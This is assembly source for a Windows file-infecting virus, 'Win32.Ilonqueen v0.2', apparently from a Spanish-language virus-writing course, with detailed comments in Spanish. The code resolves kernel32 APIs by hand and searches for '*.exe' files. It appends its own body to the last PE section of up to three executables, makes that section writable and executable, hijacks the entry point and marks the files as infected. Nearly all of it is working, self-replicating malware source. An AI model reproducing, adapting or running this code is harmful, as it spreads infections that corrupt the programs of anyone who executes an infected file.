;
;   Virus del curso de introducción a la programación
;   de virus de zeroPad
;
;   Esta variante introduce una modificación para calcular el OEP 
;   durante la ejecución del archivo infectado en lugar de ser 
;   hardcodeada por la rutina de infección

.486
.model flat, stdcall
option casemap:none
assume fs:nothing ; necesario para que no tome cualquier valor de fs



include data.inc



.code

start:

iniciovir:
;=============================================
;   Salvaguarda de registros
;=============================================
    pushad
    pushfd
;=============================================
;           acá irá nuestro virus
;=============================================

	; como hemos hecho pushad y pushfd, tenemos que sumar 24h que es el número de bytes 
	; que meten en la pila
    mov ebx, dword ptr [esp + 24h] ; para luego para obtener la base de kernel32

;===============================================================
;               Cálculo del DELTA OFFSET 
;===============================================================

    ; Delta offset para poder emplazar las variables
    call delta
delta:
    pop ebp
    sub ebp,offset delta ; restamos el offset de delta

save_entryPoin:
    ; Guardamos el entry point original, que está aquí guardado al principio
    mov eax,dword ptr [ebp + entryPoinOrig] 
    mov dword ptr [ebp + entryPointSave],eax 


    call getKernel32
    call getPEHeader
    call GiveMeGetProcAddress
    call GiveMeLoadLibrary

    call ObtenerAPIs
    call getBaseImageMemory
    
;===============================================================
;				Buscar el primer archivo exe
;===============================================================
	mov [ebp+archivosInfec],1 ; inicializamos el contador de infección
	lea edx, [ebp + FindData]
	lea ebx, [ebp + mascara]
	push edx
	push ebx 
	call [ebp+ddFindFirst]

	inc eax ; si al aumentar sale 0, error
	jz salida

    dec eax
	mov [ebp + handleBusq],eax
	call infectar

buscaVictima:
	lea edx, [ebp + FindData]
	mov ebx, [ebp + handleBusq]
	push edx
	push ebx
	call [ebp + ddFindNext]   	; Busca el proximo archivo

	test eax,eax
	jz salida

    cmp [ebp + archivosInfec],maxInfecciones
    jg Host

	call infectar
	jmp buscaVictima 

salida:
	cmp ebp,0 			; que ebp el delta offset sea 0, sólo será en el archivo principal
    je Host 

   
;=============================================
;			Recuperación de registros
;=============================================

    mov eax,[ebp + BaseFileMemory]           ; eax = ImageBase del host en memoria
    mov ebx,[ebp + entryPointSave]           ; ebx = Entry point real guardado 
    add ebx,eax
    
    call finish_it
finish_it:
    pop edi
    lea edi,[edi + 9]
    mov dword ptr [edi],ebx

    popfd
    popad

    db 104,0,0,0,0      ; Monta la instrucción push <original_entry_point>
    ret


getBaseImageMemory proc
;===============================================================
;               Función para obtener la base del archivo en memoria
;===============================================================

    push 0
    call dword ptr  [ebp+ddGetModuleHandleA]

    mov dword ptr [ebp+BaseFileMemory], eax

    ret
getBaseImageMemory endp

getKernel32 proc
;===============================================================
;				Función para obtener la base de kernel32
;===============================================================

	;===============================================================
	;              Modificamos el handler del SEH por si error
	;===============================================================
	    ; modificamos el manejador de excepciones para que no AGA1PT
	    push offset SEH_Handler    ; puntero a mi manejador
	    mov eax,fs:[0]             ; guardo actual puntero a SEH en eax
	    push eax                   ; puntero al siguiente manejador
	    mov fs:[0],esp
	    jmp getK32

	    SEH_Handler:
	        mov esp, dword ptr[esp+8]  ; recuperamos la pila
	        mov fs:[0],esp             ; metemos en fs[0] el puntero del handler del sistema
	        jmp getK32                 ; retornamos

	;===============================================================
	;               Obtención de la base de Kernel32 
	;               estamos precavidos ante errores
	;===============================================================
	getK32:
	    ; otro metodo para obtener la base de kernel32, también sería posible usando
	    ; el segmento fs, tal como se vio en el método VALTHEK
	    mov eax, ebx           ; metemos una posible dirección de kernel32 en eax
	    and eax, 0FFFFF000h    ; nos quedamos con la parte alta

	    obtenK32:                      ; bucle para obtener la base de kernel32
	        sub eax,1000h 
	        cmp word ptr [eax],'ZM'    ; vemos si es la cabecera de Kernel32
	        jnz obtenK32

	    mov [ebp+MZKernel],eax 

    ;===============================================================
	;             Reestablecer el SEH Handler 
	;===============================================================
    ; una vez finalizado, volvemos a montar el manejador de excepciones 
    mov eax,dword ptr[esp]
    mov fs:[0],eax
    add esp,8

    ret
getKernel32 endp

getPEHeader proc
;===============================================================
;           Obtención de la cabecera PE
;===============================================================
    mov edi,[ebp+MZKernel]
    mov eax, dword ptr [edi + 03Ch] ; El RVA de la cabecera PE 
    add eax,edi 					; Al RVA hay que sumarle la base
    mov [ebp+PEHeader],eax
    ret
getPEHeader endp


GiveMeGetProcAddress proc
;===============================================================
;           Obtención de la dirección de GetProcAddress
;===============================================================
    mov edi,[ebp+MZKernel]
    mov eax,[ebp+PEHeader]

    ;===============================================================
    ; 		Obtención de la dirección completa de ExportTable
    ;===============================================================
    mov esi, dword ptr [eax+078h] 	; Obtenemos el RVA de la exportTable
    add esi, edi 					; ExportTable direccion absoluta 

    ;===============================================================
    ; 	Obtención de AddressOfNames para buscar por nombre la función
    ;===============================================================
    mov edx, dword ptr [esi+020h] 	; AddressOfNames
    add edx,edi

    xor ecx, ecx

    ;===============================================================
    ; 					Obtención del desplazamiento 
    ;===============================================================
    bucle:
        mov eax, dword ptr [edx] ; Offset de un nombre
        add eax,edi 			 ; obtenemos la dirección absoluta
        cmp dword ptr [eax],'PteG'
        jnz NoPs
        cmp dword ptr [eax+4h],'Acor'
        jnz NoPs
        cmp dword ptr [eax+8h],'erdd'
        jnz NoPs
        jmp DPM
    NoPs:
        add edx, 4h 			; Apuntamos al siguiente método
        inc ecx
        jmp bucle

    DPM:
        ; Ahora en ECX tenemos el número de desplazamiento de GetProcAddress
        rol ecx, 1h 					; multiplico por 2
        mov edx, dword ptr [esi+24h] 	; AddressOfNameOrdinals
        add edx, edi 					; Obtenemos dirección absoluta de AddressOfNameOrdinals
        add edx, ecx
        movzx ecx, word ptr [edx] 		; Offset de la direccion de la funcion
        
        mov edx, dword ptr [esi+01ch] 	; RVA de AddressOfFunctions
        add edx, edi 					; Direccion absoluta AddressOfFunctions
        rol ecx,2h 						; Multiplicamos ecx por 4
        add edx, ecx 					; Offset de la dirección
        mov eax, dword ptr [edx]
        add eax, edi 					; Sumamos la base del kernel
        
        mov [ebp+ddGetProcAddress],eax

        ret
GiveMeGetProcAddress endp


GiveMeLoadLibrary proc
;===============================================================
;           Obtención de la dirección de LoadLibrary
;===============================================================
    mov edi,[ebp+MZKernel]
    mov eax,[ebp+ddGetProcAddress]

    lea esi,[ebp + stLoadLibrary]
    push esi
    push edi
    call eax

    mov [ebp+ddLoadLibrary],eax

    ret
GiveMeLoadLibrary endp


GiveMeFunction proc
;===============================================================
;			Obtención de cualquier función 
;			a través de LoadLibrary y GetProcAddress
;			retorna en eax la dirección de esa función
;===============================================================
    mov esi, dword ptr [esp + 4] ; meto el nombre de la librería
	mov edi, dword ptr [esp + 8] ; meto el nombre de la función

	; Obtención de la librería
	mov ebx, [ebp+ddLoadLibrary]
	push esi
	call ebx

	; Obtención de la función
	mov ebx, [ebp+ddGetProcAddress]
	push edi
	push eax
	call ebx

	ret
GiveMeFunction endp


ObtenerAPIs proc 
;===============================================================
;           Función para obtener la dirección de las apis 
;           antes escritas en las strings
;===============================================================
    ; como esas APIs y variables están referenciadas
    ; en memoria contiguas, podemos avanzar con punteros
    lea esi, [ebp+ stAPIs]      ; inicio de la tabla de nombres de las API's
    lea edi, [ebp+ ddFindFirst] ; inicio de la tabla de direcciones

    dec esi                     ; pa cuadrar
    obtieneAPI:
        inc esi                         ; recuadramos
        push esi                        ; mete el string
        push [ebp + MZKernel]           ; mete la dirección de kernel32
        call [ebp + ddGetProcAddress]   ; llama a GetProcAddress
        mov [edi],dword ptr eax         ; guarda la dirección obtenida
        add edi,04h                     ; aumenta al siguiente puntero
    buscaSiguiente:
        inc esi 
        cmp  byte ptr [esi], 0h
        jne buscaSiguiente

        cmp byte ptr[esi+1],0h          ; vemos si el siguiente es el final
        jne obtieneAPI                  ; si no es así, podemos seguir

        ret
ObtenerAPIs endp

infectar proc 
;===============================================================
; 			Rutina de infectado del virus
;===============================================================

    ; Obtención del tamaño de virus + archivo
    mov edi, longVirus          ; Longitud del virus
    add edi,[ebp + FindData.WFD_nFileSizeLow]
    mov [ebp + longVirusHost], edi

    ;========================================================================
    ; Llamamos a la función CreateFile para abrir el archivo 
    ;========================================================================
    xor ecx,ecx
    push ecx 
    push ecx            ; Atributos del archivo: archive, normal, sistema, etc
    push 3              ; 3 = OPEN_EXISTING
    push ecx            
    inc ecx             
    push ecx            ; Abrir en modo compartido ( 1 = FILE_SHARE_READ )
    push 0C0000000h     ; modo de acceso (read-write)
    lea ebx, [ebp + FindData.WFD_szFileName]    ; nombre del archivo
    push ebx
    call [ebp + ddCreateFile]

    cmp eax,-1
    jz buscaVictima
    mov [ebp + handleCreate], eax               ; guardamos el handle del archivo

    ;========================================================================
    ; Mapeamos el archivo en memoria
    ;========================================================================
    ; Mapeamos el archivo en memoria
    xor ecx, ecx
    push ecx                ; creamos el objeto sin nombre
    push [ebp + FindData.WFD_nFileSizeLow] 
    push ecx
    push 04h                ; 4h = PAGE_READWRITE: lectura y escritura
    push ecx                
    push eax                ; handle devuelto por CreateFileA
    call [ebp + ddCreateFileM]

    cmp eax,0
    je cerrarArchivo
    mov [ebp + handleMem], eax      ; guardamos el handle en una variable

    ;========================================================================
    ; Creamos la copia en memoria para poder accederlo
    ;========================================================================
    ; Hacemos un MapViewOfFile para cargar los datos en memoria
    push [ebp + FindData.WFD_nFileSizeLow]
    push 0
    push 0
    push 000F001Fh                  ; Modo de acceso completo
    push eax                        ; handler devuelto por CreateFileMemoryMap
    call [ebp + ddMapViewOfFile]

    cmp eax, 0                      ; by the flyies
    je cierraMapeo
    mov [ebp + inicioHostMem], eax

    ;===============================================================
    ; A partir de aquí empezamos a mirar algunos requisitos del archivo
    ;===============================================================

    ; Miramos si sus primeros bytes son MZ
    cmp word ptr [eax],'ZM'
    jnz desmapearArchivo

    ; Miramos si la cabecera contiene el PE
    add eax,03Ch                    ; Vamos al RVA de la PE
    mov ebx,[eax]                   ; Obtenemos el RVA
    add ebx,[ebp + inicioHostMem]   ; sumo la base del mapeo
    cmp word ptr [ebx], 'EP'        ; es PE?
    jnz desmapearArchivo

    ; Miramos si el tamaño del OptionalHeader es más que 0
    mov [ebp + hostPE], ebx         ; guardo la dirección de PE
    add ebx,14h                     ; Obtengo el SizeOfOptionalHeader
    movzx eax, word ptr [ebx]       ; Obtengo el tamaño del OptionalHeader (es un word)
    test eax,eax                    ; miro si es 0, en tal caso, a la mierda
    jz desmapearArchivo

    ; Miramos en las características si es un ejecutable
    mov ebx,[ebp + hostPE]
    add ebx, 16h            ; Apuntamos a las características
    mov ax, word ptr [ebx]  ; metemos en ax las características
    and ax, 0002h           ; ¿es ejecutable?
    jz desmapearArchivo

    ; Checkear si el binario ya fue manejado
    ; para ello dejaremos una marca en un campo no usado
    mov ebx,[ebp + hostPE]
    cmp dword ptr [ebx + 04Ch],'ILKA' 
    je desmapearArchivo

    ; Control de archivos infectados
    inc [ebp + archivosInfec]

    ; Obtención de los campos FileAlignment y SectionAlignment
    add     ebx, 03Ch                   ; RVA del FileAlignment
    mov     edx,[ebx]                   ; edx = alineamiento del archivo en disco
    mov     [ebp + AlineamArchivo], edx ; lo guardamos

    mov     ebx, [ebp + hostPE]         ; dirección de la cabecera PE del host
    add     ebx, 038h                   ; RVA sel SectionAlignment
    mov     edx, [ebx]                  ; edx = alineamiento del archivo en memoria
    mov     [ebp + AlineamSeccion], edx ; lo guardamos

    ;========================================================================
    ; Desmapeo del archivo en memoria y lo vuelvo a abrir con el tamaño del
    ; archivo mas el del virus
    ;========================================================================
    push [ebp + inicioHostMem]
    call [ebp + ddUnmapViewOfFile]

    push [ebp + handleMem]
    call [ebp + ddCloseHandle]

    ;========================================================================
    ; Calculamos el tamaño alineado del host mas el virus
    ;========================================================================
    mov ebx,[ebp + AlineamArchivo]
    mov eax,[ebp + longVirusHost]       ; tamaño del archivo + el virus
    xor edx,edx                         ; edx = 0 para realizar la división
    div ebx                             ; dividimos tamaño por alineamiento

    cmp edx, 0                          ; en edx queda el resto, miramos si es 0
    je no_incrementa
    inc eax

	no_incrementa:
	    mov edx, [ebp + AlineamArchivo]     ; recupero el alineamiento
	    mul edx                             ; multiplico por el alineamiento
	    mov ebx, eax                        ; guardamos en ebx, el valor obtenido

	;=====================================================
	;			Reabrimos el archivo ahora con el tamaño 
	;			unido al virus
	;=====================================================
	xor ecx,ecx
	push ecx 
	push ebx 								 ; Mapea tamaño de archivo más virus
	push ecx 
	push 04h 								 ; 4h = PAGE_READWRITE
	push ecx
	push [ebp + handleCreate]				 ; handle devuelto por CreateFileA
	call [ebp + ddCreateFileM]	

	test eax,eax
	jz cerrarArchivo
	mov [ebp + handleMem], eax 				 ; Guardamos el handle

    ;========================================================================
    ; Creamos la copia en memoria para poder accederlo
    ;========================================================================
	xor ecx,ecx
	push ebx 								 ; tamaño del archivo + el virus (alineado)	
	push ecx 
	push ecx 
	push 000F001Fh 							 ; access mode (acceso completo)
	push eax 								 ; handle devuelto por CreateFileMappingA
	call [ebp + ddMapViewOfFile]

	test eax,eax
	jz cierraMapeo
	mov [ebp + inicioHostMem], eax

	;=====================================================
	; Busqueda de la sección última para hacer un virus postpending
	;=====================================================
	mov eax, [ebp + inicioHostMem]			 ; Inicio host mapeado en memoria
	mov esi,[eax + 3Ch]                      ; cabecera PE del archivo mapeado
    add esi, eax                             ; Le sumamos la base ya que es una RVA
    movzx ebx, word ptr [esi + 14h]          ; bx = tamaño del Optional Header
    movzx ecx, word ptr [esi + 6h]           ; ecx = PE + 6h (cantidad de secciones)
    mov edx, [esi + 28h]                     ; PE + 28 = dirección del entry point original
    mov [ebp + entryPoinOrig], edx           ; lo guardamos para luego al final saltar ahí
    add esi,ebx                              ; sumamos a la base PE el tamaño del optional header
    add esi,18h                              ; +18h del tamaño de la cabecera PE (ahora apunto a las secciones)
    
    sub esi,28h                              ; le resto 28h (tamaño de cada sección para tener un bucle y empezar en la primera)
    xor eax,eax                              ; eax lo voy a usar para almacenar el mayor valor
    xor ebx,ebx                              ; ebx va a apuntar al inicio de la sección mayor

    proximaSeccion:
        add esi,28h                          ; esi = puntero a cada entrada de la tabla (lo dije antes)
        movzx edi, word ptr [esi + 14h]      ; en el offset 14h tengo el valor al PointerToRawData (comienzo de la sección)
        cmp edi, eax                         ; es mayor que la almacenada?
        jl noEsMayor
        ; Si es mayor, lo guardamos tanto tamaño como el puntero a la sección
        mov eax,edi                          ; si es mayor, guardo el valor
        mov ebx,esi                          ; y el puntero a la sección

    noEsMayor:
        loop proximaSeccion                  ; decremento ecx (donde guardo el número de secciones) y si es mayor que 0, volvemos

    ;===============================================
    ;           Ya tenemos la última sección
    ;           ahora modificarla para virusear
    ;			tendremos que ponernos detrás de 
    ;			esta última sección para agregar el virus
    ;===============================================
    or dword ptr [esi + 24h],0E0000020h       ; le metemos los permisos suficientes
    
    ; sumamos la base de la sección, más el tamaño
    mov esi, ebx
    mov edx,[esi + 10h] 					  ; SizeOfRawData de la sección
    add edx,[esi + 0Ch]						  ; SizeOfRawData + VirtualAddress

    ; Modificación de la cabecera, para cambiar el entry point
    mov eax, [ebp + inicioHostMem]			  ; eax = inicio del host mapeado en memoria
    mov edi, [eax + 3Ch] 					  ; edi = dirección del PE header del host
    add edi, eax 							  ; le sumo la base ya que es una RVA
    mov [edi + 28h],edx 					  ; cambio el valor del Entry Poin

    ;===============================================
    ; 			Obtención de la dirección para copiar
    ;			el virus, este debe ser copiado 
    ;			en disco y no en memoria (al contrario que antes)
    ;			que calculabamos la dirección donde daba saltar el EP
    ;			en MEMORIA, ahora la copia es en disco
    ;===============================================

    mov ebx, [esi + 10h] 					 ; en ESI tengo el inicio de la última seccion en memoria
    										 ; al sumar 10h, tengo en ebx, el SizeOfRawData (tamaño en disco)
 	add ebx, [esi + 14h] 					 ; Le sumo el valor de PointerToRawData (dirección en disco)
 	add ebx, [ebp + inicioHostMem]			 ; al ser un RVA le sumo la base
 	mov [ebp + UltimaSeccPE], ebx 			 ; lo guardamos

 	;===============================================
 	; Agrandamos esa última sección, teniendo en cuenta
 	; el VirtualSize (sólo sumarle el tamaño del virus)
 	; y el SizeOfRawData (sumarle el tamaño del virus),
 	; pero teniendo en cuenta el FileAlignment
 	;===============================================
 	mov eax, longVirus
 	add [esi + 08h], eax 					 ; en ESI tengo el inicio de la última sección en memoria
 											 ; y en sección + 08h la VirtualSize (ahora incrementada)
 	mov ebx,[esi + 10h]						 ; SizeOfRawData antes de modificar
 	mov [ebp + SizeOfRDAnt],ebx 		     ; lo guardamos en una variable

    add eax,ebx                              ; le sumo la SizeOfRawData actual y asi obtengo el valor a redondear 

 	mov ebx,[ebp + AlineamArchivo] 			 ; edx = alineamiento de las secciones en disco
 	xor edx,edx
 	div ebx 								 ; igual que antes dividimos por ebx
 	

 	cmp edx, 0 								 ; en edx queda el resto de la división
 	je no_incrementaSecc 		
 	inc eax 								 ; si el resto es distinto de cero le suma uno

 	no_incrementaSecc:
 		mov edx, [ebp + AlineamArchivo] 	 ; edx = alineamiento de las secciones en disco
 		mul edx 							 ; multiplico por el alineamiento y obtengo así el 
 											 ; tamaño alineado en eax
 		mov [ebp + SizeOfRDNuevo], eax 		 ; guardo el nuevo valor del 
 											 ; SizeOfRawData alineado
 		mov [esi + 10h],eax 				 ; Cambio el valor del SizeOfRawData del host

 	; Ahora debemos establecer el SizeOfImage como el total
 	; del malware, alineado
 	mov eax,[esi + 08h] 					 ; eax = VirtualSize
 	add eax,[esi + 0Ch]						 ; eax = VirtualSize + VirtualOffset

 	mov ebx, [ebp + AlineamSeccion] 		 ; ebx = alineamiento de las secciones en memoria

 	xor edx, edx 							 ; ponemos edx en cero para realizar la división
 	div ebx 								 ; dividimos por el alineamiento

 	cmp edx,0 								 ; en edx queda el resto de la división
 	je no_incrementaSizeOfI 
 	inc eax

 	no_incrementaSizeOfI:
 		mov edx,[ebp + AlineamSeccion] 		 ; edx = alineamiento de las secciones en memoria
 		mul edx 							 ; multiplico por el alineamiento y obtengo así el tamaño alineado en eax

 	mov esi,[ebp + inicioHostMem]   		 ; apuntamos al inicio del host mapeado en memoria
 	mov edi,[esi + 3Ch]						 ; edi = dirección del PE header del host
 	add edi,esi 							 ; sumamos la base ya que es una RVA

 	mov [edi + 50h],eax 					 ; guardo la nueva SizeOfImage obtenida

 	;===============================================
 	; 		Finalmente copiamos el virus en la memoria
 	; 		para ello usamos ret y movb
 	;===============================================
 	lea esi,[ebp + start]
 	mov edi,[ebp + UltimaSeccPE]
 	mov ecx,longVirus

 	rep movsb

    ;========================================================================
    ; Lo marco como infectado para no volverlo a infectar
    ;========================================================================
    ; ahora firmamos el archivo
    mov ebx, [ebp + hostPE]
    mov dword ptr [ebx + 04Ch],'ILKA'
    

    desmapearArchivo:
        ; Fin del virús
        push [ebp + inicioHostMem]
        call [ebp + ddUnmapViewOfFile]

    cierraMapeo:
        push [ebp + handleMem]
        call [ebp + ddCloseHandle]

    cerrarArchivo:
        push [ebp + handleCreate]
        call [ebp + ddCloseHandle]
        
	ret
infectar endp

datos_ricos:
    ;=============================================
    ;            Parte data, pero en code
    ;=============================================
    mensaje         db      'Win32.Ilonqueen',10,10
                    db      'No game, no life',10,10

    titulo          db      '[Win32.Ilonqueen v0.2]',0
    stUser32        db      'user32',0
    stKernel32      db      'kernel32',0
    stMessageBox    db      'MessageBoxA',0
    stExitProcess   db      'ExitProcess',0

    ;=============================================
    ;   Información necesaria para la infección
    ;=============================================
    longVirus               equ             finvir - start      ; Tamaño del virus
    longVirusHost           dd              0                   ; tamaño del virus más el host
    entryPoinOrig           dd              0                   ; entry point del archivo original
    entryPointSave          dd              0                   ; Este el archivo infectado no lo modificará para calcular 
    UltimaSeccPE 			dd 				0 					; final de última seccion en disco
   	SizeOfRDAnt 			dd 				0 					; SizeOfRawData antes del cambio
   	SizeOfRDNuevo 			dd 				0 					; SizeOfRawData después del cambio

	maxInfecciones			equ				3
	archivosInfec			db 				0
    hostPE                  dd              0
    AlineamArchivo          dd              0
    AlineamSeccion          dd              0


    mascara					db 				'*.exe',0

    stLoadLibrary  			db 				'LoadLibraryA',0
    stAPIs                  db              'FindFirstFileA',0
                            db              'FindNextFileA',0
                            db              'CreateFileA',0
                            db              'CreateFileMappingA',0
                            db              'MapViewOfFile',0
                            db              'CloseHandle',0
                            db              'UnmapViewOfFile',0
                            db              'GetModuleHandleA', 0
                            db              0


    MZKernel                dd              ?
    PEHeader                dd              ?
    ddGetProcAddress        dd              ?
    ddLoadLibrary           dd              ?
    FindData				WIN32_FIND_DATA <>
    handleBusq				dd 				0
    handleCreate            dd              0
    handleMem               dd              0
    inicioHostMem           dd              0
    BaseFileMemory          dd              0

    ddFindFirst             dd              ?
    ddFindNext              dd              ?
    ddCreateFile            dd              ?
    ddCreateFileM           dd              ?
    ddMapViewOfFile         dd              ?
    ddCloseHandle           dd              ?
    ddUnmapViewOfFile       dd              ?
    ddGetModuleHandleA      dd              ?

Host:

    
    ; Obtengo MessageBoxA
    lea ebx, [ebp + stMessageBox]
    push ebx
    lea ebx, [ebp + stUser32]
    push ebx
    call GiveMeFunction

    push 0
    lea ebx,[ebp + titulo]
    push ebx
    lea ebx, [ebp + mensaje]
    push ebx
    push 0
    call eax

    lea ebx, [ebp + stExitProcess]
    push ebx
    lea ebx, [ebp + stKernel32]
    push ebx
    call GiveMeFunction

    push 0
    call eax


finvir:

end start